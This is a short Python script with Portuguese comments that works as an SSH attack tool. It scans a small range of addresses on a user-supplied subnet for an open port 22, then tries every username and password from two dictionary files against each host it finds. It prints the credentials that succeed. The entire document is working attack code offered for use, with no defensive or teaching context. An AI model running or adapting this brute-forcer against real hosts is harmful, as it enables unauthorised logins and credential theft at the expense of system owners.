import socket
import paramiko

host = input("Endereço para o ataque: (xxx.xxx.x) ")

hostList = []
credentialsList = []

def ssh_connection(user, senha, aux = 0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy)

    try:
        ssh.connect(host, port=22, username=user, password=senha) #Tenta conectar ao servidor
    except paramiko.AuthenticationException:
        aux = 1
    
    ssh.close()
    return aux

def bruteForce(host, user, senha):
    print("Testando: ", host, "/", user, "/", senha)

    resultadoSSH = ssh_connection(user,senha)

    if resultadoSSH == 0:
        credentialsList.append("Host: " + host + " Usuario = " + user + " / Senha = " + senha)
        return 1
    elif resultadoSSH == 1:
        pass

    return 0

def testHost(host):

    for ping in range(100,110):

        address = host + "." + str(ping)  

        location = (address, 22)
        a_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        a_socket.settimeout(1)
        resultado = a_socket.connect_ex(location) #Testa a porta para a conexão

        if resultado == 0:
            print("Porta 22 aberta host: ", address, "\n")
            hostList.append(address)
        else:
            pass

testHost(host)

test = 0
for host in hostList:
    test = 0
    with open("dicionario_user.txt") as usernames:
        for users in usernames:
            if test == 1:
                break
            with open("dicionario_pass.txt") as passwords:
                for passw in passwords:
                    test = bruteForce(host, users.rstrip(), passw.rstrip())
                    if test == 1:
                        break

for credential in credentialsList:
    print(credential)